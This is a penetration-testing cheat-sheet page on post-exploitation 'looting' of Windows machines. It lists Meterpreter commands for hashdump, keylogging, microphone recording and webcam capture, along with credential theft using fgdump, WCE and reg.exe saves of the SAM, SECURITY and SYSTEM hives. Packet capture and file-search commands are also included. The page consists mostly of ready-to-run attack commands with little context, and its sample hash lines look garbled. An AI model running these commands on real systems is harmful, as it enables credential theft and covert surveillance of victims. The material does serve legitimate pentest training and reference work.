---
description: Grab all the things
---

# Loot

### Meterpreter <a id="meterpreter"></a>

If you have a meterpreter shell you are able to do a lot of thing with very little effort. If you do not have a meterpreter-shell you can always create a exploit with msfvenom. An elf or exe or other format to upgrade your shell.

Show help of all commands:

```text
-h
```

**Dump windows hashes for further analysis**

```text
hashdump
```

Keylogger

```text
keysscan_start
keyscan_dump
keyscan_stop
```

**Mic and webcam commands**

```text
record_mic     Record audio from the default microphone for X seconds
webcam_chat    Start a video chat
webcam_list    List webcams
webcam_snap    Take a snapshot from the specified webcam
webcam_stream  Play a video stream from the specified webcam
```

### Dumping passwords and hashes on windows <a id="dumping-passwords-and-hashes-on-windows"></a>

This most likely requires administrative rights, that's why the chapter is found here and not in priv-esc. Once you have a hash you can move on to the Password Cracking-chapter where we discuss different techniques of cracking hashes.

Windows stores passwords in SAM - Security Account Manager. Passwords are stored differently depending on the operating system. Up until \(and including\) Windows 2003 stored the passwords in LAN Manager \(LM\) and NT LAN Manager \(NTLM\). LM is incredibly insecure. From windows vista and on the system does not use LM, only NTLM. So it is a bit more secure.

**LM and NTLM &gt;= Windows 2003**

**NTLM &gt; Windows vista**

#### LM Hashes <a id="lm-hashes"></a>

LM hashes can be really easy to crack. The LM part in the example below is the first part.

```text
Administrator:500:FA21A6D3CF(01B8BAAD3B435B51404EE:C294D192B82B6AA35C3DFCA81F1F59BC:::
```

Example of NT

```text
Administrator:500:NO PASSWORD*********************:BE134K40129560B46534340292AF4E72:::
```

#### fgdump.exe <a id="fgdumpexe"></a>

We can use `fgdump.exe` \(`locate fgdump.exe` on kali\) to extract NTLM and LM Password hashes. Run it and there is a file called 127.0.0.1.pwndump where the hash is saved. Now you can try to brute force it.

#### Windows Credential Editor \(WCE\) <a id="windows-credencial-editor-wce"></a>

WCE can steal NTLM passwords from memory in cleartext! There are different versions of WCE, one for 32 bit systems and one for 64 bit. So make sure you have the right one.

You can run it like this

```text
wce32.exe -w
```

#### Loot registry without tools <a id="loot-registry-without-tools"></a>

This might be a better technique than using tools like wce and fgdump, since you don't have to upload any binaries. Get the registry:

```text
C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
C:\> reg.exe save hklm\security c:\windows\temp\security.save
C:\> reg.exe save hklm\system c:\windows\temp\system.save
```

The hashes can be extracted using `secretdump.py` or `pwdump`

#### Pwdump 7 <a id="pwdump-7"></a>

[http://www.tarasco.org/security/pwdump\_7/](http://www.tarasco.org/security/pwdump_7/)

### VNC <a id="vnc"></a>

VNC require a specific password to log in to. So it is not the same password as the user password. If you have a meterpreter shell you can run the post exploit module to get the VNC password.

```text
background
use post/windows/gather/credentials/vnc
set session X
exploit
```

### Tcp-dump on Windows <a id="tcp-dump-on-winfows"></a>

You can use meterpreter to easily take a tcp-dump, like this:

```text
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

#### Search for interesting files <a id="search-for-interesting-files"></a>

```text
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

# Recursive search
dir /s
```

### References <a id="references"></a>

This is a great post [https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/](https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/)[  
](https://xapax.gitbooks.io/security/content/loot.html)

